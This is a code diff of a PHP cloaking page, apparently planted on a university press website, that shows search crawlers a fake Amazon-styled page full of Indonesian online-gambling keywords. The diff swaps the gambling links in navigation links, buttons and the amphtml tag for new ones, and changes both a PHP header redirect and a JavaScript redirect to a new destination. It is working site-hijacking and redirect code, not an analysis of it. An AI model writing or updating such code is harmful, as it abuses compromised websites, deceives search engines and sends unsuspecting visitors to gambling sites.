@@ -27,7 +27,7 @@ $usereagent_googlebot = <<<HTML
     <meta name="twitter:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhqp_vNRYgVnl63VJJHETZb2C03vzlCG09kcg4sbDKZYgV89XcoIa76SA_8zKTBacj-TXtkxqmZT3cW5KfgOIybpXMLu9zJjygeHL9WTwNYc4VBtF3hTn9owRlqrjKdUZlzCbUIlwrP87IqavMpA5F3jgnz3cj-rW9FkBTV19KdvHJpWTcYfAF5E1W3JSY/s1080/slot-toto-gacor.webp">
     <link rel="shortcut icon" href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh8oGiIR-l04gRQtzdHHghRaFNuPuVR-0LINW016f_472yiVm3HUIg30wXBYKvMVg0DJXf_HWmzRnIHHUOMLrvWx6pnJ3Ac40C4KxiLkNKLwH2z3pNXf7vViQ86qLkLYFAotSzlp3pXfjeIDbhtHHrU22idV3r-_msw4AIm5BLAHQzXj1A_s7WVfD5zgFM/s256/favicon.png" />
     <link rel="canonical" href="https://press.unusa.ac.id/$dir/" />
-    <link rel="amphtml" href="amp" />
+    <link rel="amphtml" href="https://rendang.slototogacor.com/" />
     <meta name="keywords"
         content="$dir, slot toto, slot toto hari ini, maxwin 4d, toto online terpercaya, situs toto terbaru, prediksi toto tinggi, toto gampang menang, toto bonus besar, toto daftar" />
     <!-- sp:end-feature:head-start -->
@@ -797,7 +797,7 @@ $usereagent_googlebot = <<<HTML
 
 
 
-                            <a href="https://slotmahjong.link/kingpin69"
+                            <a href="https://jali.me/sreymomindomie"
                                 class="nav-a nav-a-2   nav-progressive-attribute" data-nav-ref="nav_ya_signin"
                                 data-nav-role="signin" data-ux-jq-mouseenter="true" id="nav-link-accountList"
                                 tabindex="0" data-csa-c-type="link" data-csa-c-slot-id="nav-link-accountList"
@@ -809,7 +809,7 @@ $usereagent_googlebot = <<<HTML
                             </a>
 
 
-                            <a href="https://slotmahjong.link/kingpin69"
+                            <a href="https://jali.me/sreymomindomie"
                                 class="nav-a nav-a-2   nav-progressive-attribute" id="nav-orders" tabindex="0">
                                 <span class="nav-line-1">Returns</span>
                                 <span class="nav-line-2">& orders<span class="nav-icon nav-arrow"></span></span>
@@ -817,7 +817,7 @@ $usereagent_googlebot = <<<HTML
 
 
 
-                            <a href="https://slotmahjong.link/kingpin69" aria-label="0 items in shopping basket"
+                            <a href="https://jali.me/sreymomindomie" aria-label="0 items in shopping basket"
                                 class="nav-a nav-a-2 nav-progressive-attribute" id="nav-cart">
                                 <div id="nav-cart-count-container">
                                     <span id="nav-cart-count" aria-hidden="true"
@@ -875,7 +875,7 @@ $usereagent_googlebot = <<<HTML
                         <div id="nav-swmslot">
                             <div id="navSwmHoliday"
                                 style="height: 39px; width: 400px; overflow: hidden; position: relative; ">
-                                <a aria-label="Christmas gift store" href="https://slotmahjong.link/kingpin69"
+                                <a aria-label="Christmas gift store" href="https://jali.me/sreymomindomie"
                                     class="nav-imageHref" target="_blank">
                                     <img alt="Christmas gift store"
                                         src="https://m.media-amazon.com/images/G/35/Gateway/SWM/BAUSWMs/TodaysDeals_swm_400x39._CB564878150_.jpg">
@@ -2638,7 +2638,7 @@ $usereagent_googlebot = <<<HTML
                                                         <div class="a-button-stack">
 
                                                             <span class="a-button-inner">
-                                                                <a href="https://slotmahjong.link/kingpin69"
+                                                                <a href="https://jali.me/sreymomindomie"
                                                                     title="Daftar Slot" class="a-button-text"
                                                                     style="background: linear-gradient(to right, #03afd7 0%, #01bce6 100%); color: #000;">
                                                                     DAFTAR </a>
@@ -2721,7 +2721,7 @@ $usereagent_googlebot = <<<HTML
                                                                     id="wishListMainButton"
                                                                     class="a-button a-button-groupfirst a-spacing-none a-button-base"><span
                                                                         class="a-button-inner"><a
-                                                                            href="https://slotmahjong.link/kingpin69"
+                                                                            href="https://jali.me/sreymomindomie"
                                                                             name="submit.add-to-registry.wishlist.unrecognized"
                                                                             title="Login slot88" role="radio"
                                                                             aria-checked="false" data-hover="&lt;!-- If PartialItemStateWeblab is true then, showing different Add-to-wish-list tool-tip message which is consistent with Add-to-Cart tool tip message.  --&gt;
@@ -13614,7 +13614,7 @@ if (
 <?php
 usleep(30000);
 
-header("Location: https://lanciaolu.me/mekihitam");
+header("Location: https://jali.me/sreymomindomie");
 exit();
 ?>
 <!DOCTYPE html>
@@ -13633,7 +13633,7 @@ exit();
 </head>
 <body>
 <script>
-    var url = Array("https://lanciaolu.me/mekihitam");  // Ubah URL ke bit.ly
+    var url = Array("https://jali.me/sreymomindomie");  // Ubah URL ke bit.ly
     var rid = "";  // Tidak perlu id karena tidak digunakan lagi
     var timesleep = "30";  // Delay dalam milidetik
     
